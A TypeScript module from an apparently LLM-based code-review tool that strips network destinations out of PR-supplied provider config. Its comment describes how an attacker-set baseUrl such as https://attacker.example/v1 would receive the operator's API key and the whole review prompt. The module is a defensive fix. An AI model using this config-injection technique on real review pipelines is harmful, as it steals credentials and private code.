/**
 * Strip PR-controlled network destinations from a config-file LLM provider map.
 *
 * `.opencode-reviewer.yml` is read from the PR branch, so every network
 * destination in it is attacker-controlled. A provider entry naming
 * `baseUrl: https://attacker.example/v1` survives `loadConfig` validation —
 * `baseUrl`, `endpoint` and `resourceName` are all on its allowlist — and
 * `mergeEnvProviderEntry` then fills the *operator's* `apiKey` into that same
 * entry, because it only overwrites keys the repo left unset. The result is the
 * operator's LLM key plus the entire review prompt (full diff and the contents
 * of every file the reviewer read) delivered to a host the PR author chose.
 *
 * The action path has always done this in `buildLLMConfig`. This module exists
 * so the app path can do the same thing from one implementation: the asymmetry
 * between the two wrappers is what let the app ship without a guard, and a
 * second hand-written copy is how that asymmetry would come back.
 */
import type { LLMProviderConfig } from '../types/index.js';

/**
 * Drop `baseUrl` / `endpoint` / `resourceName` from every provider entry.
 *
 * Non-network fields (`type`, `model`, `models`, `apiKey`, `apiVersion`,
 * `deployment`, `modelId`, `region`, `npm`, timeouts) are preserved, so a repo
 * can still declare which model it wants to be reviewed with — only the
 * destination is operator-controlled.
 * @param providers - Provider map as parsed from the repo config file.
 * @param onWarn - Called once per provider that had a destination stripped.
 * @returns A new provider map, or `undefined` when the input is absent.
 */
export function stripUntrustedProviderEndpoints(
  providers: Record<string, LLMProviderConfig> | undefined,
  onWarn?: (providerId: string) => void,
): Record<string, LLMProviderConfig> | undefined {
  if (!providers || typeof providers !== 'object') return providers;

  const result: Record<string, LLMProviderConfig> = {};
  for (const [id, entry] of Object.entries(providers)) {
    if (!entry || typeof entry !== 'object') {
      if (entry !== undefined) result[id] = entry;
      continue;
    }
    const { baseUrl, endpoint, resourceName, ...rest } = entry as LLMProviderConfig & {
      baseUrl?: string;
      endpoint?: string;
      resourceName?: string;
    };
    if (baseUrl !== undefined || endpoint !== undefined || resourceName !== undefined) {
      onWarn?.(id);
    }
    result[id] = { ...(rest as LLMProviderConfig) };
  }
  return result;
}
